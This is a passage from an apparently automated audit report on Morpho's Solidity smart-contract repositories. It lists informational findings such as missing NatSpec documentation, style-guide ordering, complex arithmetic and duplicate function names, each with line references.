[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L7), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L9), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L13)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWNative.sol

/// @audit missed @return
7:     function approve(address guy, uint256 wad) external returns (bool);

/// @audit missed @return
8:     function transferFrom(address src, address dst, uint256 wad) external returns (bool);

```

[7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L7), [8](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L8)

```solidity
File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

/// @audit missed @return
5:     function DOMAIN_SEPARATOR() external view returns (bytes32);

/// @audit missed @return
7:     function allowance(address owner, address spender) external view returns (uint256);

/// @audit missed @return
8:     function approve(address spender, uint256 amount) external returns (bool);

/// @audit missed @return
9:     function balanceOf(address account) external view returns (uint256);

/// @audit missed @return
10:     function decimals() external view returns (uint8);

/// @audit missed @return
11:     function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);

/// @audit missed @return
12:     function getStETHByWstETH(uint256 wstETHAmount) external view returns (uint256);

/// @audit missed @return
13:     function getWstETHByStETH(uint256 stETHAmount) external view returns (uint256);

/// @audit missed @return
14:     function increaseAllowance(address spender, uint256 addedValue) external returns (bool);

/// @audit missed @return
15:     function name() external view returns (string memory);

/// @audit missed @return
16:     function nonces(address owner) external view returns (uint256);

/// @audit missed @return
19:     function stETH() external view returns (address);

/// @audit missed @return
20:     function stEthPerToken() external view returns (uint256);

/// @audit missed @return
21:     function symbol() external view returns (string memory);

/// @audit missed @return
22:     function tokensPerStEth() external view returns (uint256);

/// @audit missed @return
23:     function totalSupply() external view returns (uint256);

/// @audit missed @return
24:     function transfer(address recipient, uint256 amount) external returns (bool);

/// @audit missed @return
25:     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

/// @audit missed @return
26:     function unwrap(uint256 wstETHAmount) external returns (uint256);

/// @audit missed @return
27:     function wrap(uint256 stETHAmount) external returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L7), [8](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L8), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L9), [10](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L10), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L11), [12](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L12), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L13), [14](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L14), [15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L15), [16](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L16), [19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L19), [20](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L20), [21](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L21), [22](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L22), [23](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L23), [24](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L24), [25](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L25), [26](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L26), [27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L27)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV2MigrationBundler.sol

/// @audit missed @return
64:     function _isSenderAuthorized() internal view virtual override(BaseBundler, MigrationBundler) returns (bool) {

```

[64](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L64)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol

/// @audit missed @return
78:     function _isSenderAuthorized() internal view override(BaseBundler, MigrationBundler) returns (bool) {

```

[78](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L78)

```solidity
File: morpho-blue-bundlers/src/migration/MigrationBundler.sol

/// @audit missed @return
27:     function _isSenderAuthorized() internal view virtual override(BaseBundler, MorphoBundler) returns (bool) {

```

[27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/MigrationBundler.sol#L27)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

/// @audit missed @return
252:     function getReservesList() external view returns (address[] memory);

/// @audit missed @return
254:     function getAddressesProvider() external view returns (address);

/// @audit missed @return
258:     function paused() external view returns (bool);

/// @audit missed @return
260:     function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint256);

```

[252](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L252), [254](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L254), [258](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L258), [260](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L260)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

/// @audit missed @return
7:     function balanceOf(address) external view returns (uint256);

/// @audit missed @return
9:     function exchangeRateStored() external view returns (uint256);

/// @audit missed @return
11:     function redeem(uint256 redeemTokens) external returns (uint256);

/// @audit missed @return
13:     function redeemUnderlying(uint256 redeemAmount) external returns (uint256);

/// @audit missed @return
15:     function borrow(uint256 borrowAmount) external returns (uint256);

```

[7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L7), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L9), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L13), [15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L15)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

/// @audit missed @return
5:     function underlying() external returns (address);

/// @audit missed @return
7:     function balanceOf(address) external view returns (uint256);

/// @audit missed @return
9:     function exchangeRateStored() external view returns (uint256);

/// @audit missed @return
11:     function repayBorrowBehalf(address borrower, uint256 repayAmount) external returns (uint256);

/// @audit missed @return
13:     function redeem(uint256 redeemTokens) external returns (uint256);

/// @audit missed @return
15:     function redeemUnderlying(uint256 redeemAmount) external returns (uint256);

/// @audit missed @return
17:     function borrow(uint256 borrowAmount) external returns (uint256);

/// @audit missed @return
19:     function mint(uint256 mintAmount) external returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L7), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L9), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L13), [15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L15), [17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L17), [19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L19)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

/// @audit missed @return
21:     function name() external view returns (string memory);

/// @audit missed @return
23:     function version() external view returns (string memory);

/// @audit missed @return
25:     function baseToken() external view returns (address);

/// @audit missed @return
27:     function userCollateral(address account, address asset) external view returns (uint256);

/// @audit missed @return
29:     function balanceOf(address account) external view returns (uint256);

/// @audit missed @return
31:     function borrowBalanceOf(address account) external view returns (uint256);

```

[21](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L21), [23](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L23), [25](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L25), [27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L27), [29](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L29), [31](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L31)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IComptroller.sol

/// @audit missed @return
5:     function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IComptroller.sol#L5)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

/// @audit missed @return
94:     function borrowRateView(MarketParams memory marketParams, Market memory market) external view returns (uint256) {

/// @audit missed @return
100:     function borrowRate(MarketParams memory marketParams, Market memory market) external returns (uint256) {

/// @audit missed @return
117:     function _borrowRate(Id id, Market memory market) private view returns (uint256, int256) {

/// @audit missed @return
175:     function _curve(int256 _rateAtTarget, int256 err) private view returns (int256) {

/// @audit missed @return
184:     function _newRateAtTarget(int256 startRateAtTarget, int256 linearAdaptation) private pure returns (int256) {

```

[94](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L94), [100](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L100), [117](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L117), [175](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L175), [184](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L184)

```solidity
File: morpho-blue-irm/src/libraries/MathLib.sol

/// @audit missed @return
13:     function wMulDown(int256 a, int256 b) internal pure returns (int256) {

/// @audit missed @return
17:     function wDivDown(int256 a, int256 b) internal pure returns (int256) {

```

[13](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L13), [17](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L17)

```solidity
File: morpho-blue-irm/src/libraries/UtilsLib.sol

/// @audit missed @return (z)
11:     function bound(int256 x, int256 low, int256 high) internal pure returns (int256 z) {

```

[11](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/UtilsLib.sol#L11)

```solidity
File: morpho-blue-oracles/src/ChainlinkOracle.sol

/// @audit missed @return
116:     function price() external view returns (uint256) {

```

[116](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L116)

```solidity
File: morpho-blue-oracles/src/interfaces/AggregatorV3Interface.sol

/// @audit missed @return
7:     function decimals() external view returns (uint8);

/// @audit missed @return
9:     function description() external view returns (string memory);

/// @audit missed @return
11:     function version() external view returns (uint256);

/// @audit missed @return (roundId, answer, startedAt, updatedAt, answeredInRound)
13:     function getRoundData(uint80 _roundId)

/// @audit missed @return (roundId, answer, startedAt, updatedAt, answeredInRound)
18:     function latestRoundData()

```

[7](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L7), [9](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L9), [11](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L11), [13](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L13), [18](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L18)

```solidity
File: morpho-blue-oracles/src/interfaces/IERC4626.sol

/// @audit missed @return
5:     function convertToAssets(uint256) external view returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/IERC4626.sol#L5)

```solidity
File: morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol

/// @audit missed @return
20:     function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {

/// @audit missed @return
31:     function getDecimals(AggregatorV3Interface feed) internal view returns (uint256) {

```

[20](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L20), [31](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L31)

```solidity
File: morpho-blue-oracles/src/libraries/VaultLib.sol

/// @audit missed @return
13:     function getAssets(IERC4626 vault, uint256 shares) internal view returns (uint256) {

```

[13](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/VaultLib.sol#L13)

```solidity
File: universal-rewards-distributor/src/interfaces/IUniversalRewardsDistributor.sol

/// @audit missed @return
18:     function root() external view returns (bytes32);

/// @audit missed @return
19:     function owner() external view returns (address);

/// @audit missed @return
20:     function timelock() external view returns (uint256);

/// @audit missed @return
21:     function ipfsHash() external view returns (bytes32);

/// @audit missed @return
22:     function isUpdater(address) external view returns (bool);

/// @audit missed @return
23:     function claimed(address, address) external view returns (uint256);

/// @audit missed @return (amount)
34:     function claim(address account, address reward, uint256 claimable, bytes32[] memory proof)

/// @audit missed @return (root, ipfsHash, validAt)
43:     function pendingRoot() external view returns (bytes32 root, bytes32 ipfsHash, uint256 validAt);

/// @audit missed @return
52:     function pendingRoot() external view returns (PendingRoot memory);

```

[18](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L18), [19](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L19), [20](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L20), [21](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L21), [22](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L22), [23](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L23), [34](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L34), [43](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L43), [52](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L52)




### Use `@inheritdoc` rather than using a non-standard annotation

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

It is recommended that Solidity contracts are fully annotated using NatSpec for all public interfaces (everything in the ABI). It is clearly stated in the Solidity official documentation. In complex projects such as Defi, the interpretation of all functions and their arguments and returns is important for code readability and auditability.[source](https://docs.soliditylang.org/en/v0.8.15/natspec-format.html)

*Instances (2)*:

```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

58:     function decimals() public view virtual override(ERC20, ERC20Wrapper) returns (uint8) {

64:     /// @dev See {ERC20Wrapper-_update}.
65:        /// @dev The sender is not checked. Override this function to check the sender if needed.
66:        function _update(address from, address to, uint256 value) internal virtual override {

```

[58](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L58), [64-66](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L64-L66)




### Modifier declaration should include NatSpec `@notice` documentation

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (6)*:

```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit missed @notice
139:     modifier onlyCuratorRole() {

/// @audit missed @notice
147:     modifier onlyAllocatorRole() {

/// @audit missed @notice
157:     modifier onlyGuardianRole() {

/// @audit missed @notice
164:     modifier onlyCuratorOrGuardianRole() {

/// @audit missed @notice
176:     modifier afterTimelock(uint256 validAt) {

```

[139](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L139), [147](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L147), [157](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L157), [164](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L164), [176](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L176)

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

/// @audit missed @notice
31:     modifier protected() {

```

[31](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L31)




### Modifier declaration should include NatSpec `@dev` documentation

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (2)*:

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

/// @audit missed @dev
49:     modifier onlyOwner() {

/// @audit missed @dev
55:     modifier onlyUpdaterRole() {

```

[49](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L49), [55](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L55)



### Modifier declaration should include NatSpec `@param` documentation

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (1)*:

```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit missed @param (validAt)
176:     modifier afterTimelock(uint256 validAt) {

```

[176](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L176)



### State variable declaration should include NatSpec documentation

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

State variables should be commented to explain their purpose.

*Instances (1)*:


```solidity
File: universal-rewards-distributor/src/UrdFactory.sol

15:     mapping(address => bool) public isUrd;

```

[15](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UrdFactory.sol#L15)




### Not using the named return variables anywhere in the function is confusing

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Consider changing the variable to be an unnamed one, since the variable is never assigned, nor is it returned by name

*Instances (1)*:

```solidity
File: morpho-blue-irm/src/libraries/UtilsLib.sol

11:     function bound(int256 x, int256 low, int256 high) internal pure returns (int256 z) {

```

[11](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/UtilsLib.sol#L11)




### Overly complicated arithmetic

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

To maintain readability in code, particularly in Solidity which can involve complex mathematical operations, it is often recommended to limit the number of arithmetic operations to a maximum of 2-3 per line. Too many operations in a single line can make the code difficult to read and understand, increase the likelihood of mistakes, and complicate the process of debugging and reviewing the code. Consider splitting such operations over more than one line, take special care when dealing with division however. Try to limit the number of arithmetic operations to a maximum of 3 per line.

*Instances (1)*:

```solidity
File: morpho-blue-oracles/src/ChainlinkOracle.sol

106:         SCALE_FACTOR = 10
107:                 ** (
108:                     36 + quoteTokenDecimals + quoteFeed1.getDecimals() + quoteFeed2.getDecimals() - baseTokenDecimals
109:                         - baseFeed1.getDecimals() - baseFeed2.getDecimals()
110:                 ) / vaultConversionSample;

```

[106-110](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L106-L110)



### Polymorphic functions make security audits more time-consuming and error-prone

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

The instances below point to one of two functions with the same name. Consider naming each function differently, in order to make code navigation and analysis easier.

*Instances (10)*:


```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

81:     function config(Id) external view returns (uint184 cap, bool enabled, uint64 removableAt);

82:     function pendingGuardian() external view returns (address guardian, uint64 validAt);

83:     function pendingCap(Id) external view returns (uint192 value, uint64 validAt);

84:     function pendingTimelock() external view returns (uint192 value, uint64 validAt);

92:     function config(Id) external view returns (MarketConfig memory);

93:     function pendingGuardian() external view returns (PendingAddress memory);

94:     function pendingCap(Id) external view returns (PendingUint192 memory);

95:     function pendingTimelock() external view returns (PendingUint192 memory);

```

[81](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L81), [82](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L82), [83](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L83), [84](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L84), [92](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L92), [93](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L93), [94](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L94), [95](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L95)

```solidity
File: universal-rewards-distributor/src/interfaces/IUniversalRewardsDistributor.sol

43:     function pendingRoot() external view returns (bytes32 root, bytes32 ipfsHash, uint256 validAt);

52:     function pendingRoot() external view returns (PendingRoot memory);

```

[43](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L43), [52](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L52)




### Setters should prevent re-setting of the same value

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

This especially problematic when the setter also emits the same value, which may be confusing to offline parsers

*Instances (5)*:


```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit timelock
748:     function _setTimelock(uint256 newTimelock) internal {

/// @audit guardian
757:     function _setGuardian(address newGuardian) internal {

/// @audit lastTotalAssets
895:     function _updateLastTotalAssets(uint256 updatedTotalAssets) internal {

```

[748](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L748), [757](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L757), [895](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L895)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

/// @audit owner
193:     function _setOwner(address newOwner) internal {

/// @audit timelock
200:     function _setTimelock(uint256 newTimelock) internal {

```

[193](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L193), [200](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L200)



###  Contract does not follow the Solidity style guide's suggested layout ordering	_(duplicate of [Contract does not follow the Solidity style guide's suggested layout ordering])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

The [style guide](https://docs.soliditylang.org/en/v0.8.16/style-guide.html#order-of-layout)says that, within a contract, the ordering should be 1) Type declarations, 2) State variables, 3) Events, 4) Modifiers, and 5) Functions, but the contract(s) below do not follow this ordering

*Instances (35)*:


```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

20:     error NoPermission(address account);

28:     address public immutable BUNDLER;

```

[20](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L20), [28](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L28)

```solidity
File: metamorpho/src/MetaMorpho.sol

44:     using Math for uint256;

45:     using UtilsLib for uint256;

46:     using SafeCast for uint256;

47:     using SafeERC20 for IERC20;

48:     using MorphoLib for IMorpho;

49:     using SharesMathLib for uint256;

50:     using MorphoBalancesLib for IMorpho;

